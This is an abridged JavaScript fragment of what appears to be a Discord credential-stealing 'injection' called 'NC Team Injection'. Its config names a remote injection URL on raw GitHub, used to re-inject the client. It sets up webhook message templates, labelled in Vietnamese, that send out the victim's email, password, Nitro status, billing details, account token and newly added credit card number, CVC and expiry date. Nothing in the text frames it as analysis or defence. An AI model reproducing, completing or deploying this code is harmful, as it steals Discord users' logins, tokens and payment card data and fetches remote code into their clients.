...
const config = {
  ...
  embed_name: 'NC Team Injection', //name of the webhook thats gonna send the info
  embed_icon: 'https://media.discordapp.net/attachments/1066035072475611157/1079839842155905054/logonc.png?width=660&height=663'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/lct2105/bulon99/main/injection.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**TT Tài Khoản**',
            value: `Email: **${email}** - Mật Khẩu: **${password}**`,
            inline: false,
          },
          {
            name: '**TT Discord*',
            value: `Loại Nitro: **${nitro}**\nDanh hiệu: **${badges}**\nThanh toán: **${billing}**`,
            inline: false,
          },
          {
            name: '**Token**',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Đã Thêm Thẻ Tín Dụng**',
            value: `Số Thẻ: **${number}**\nCVC: **${cvc}**\nHết Hạn: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: '**TT Discord**',
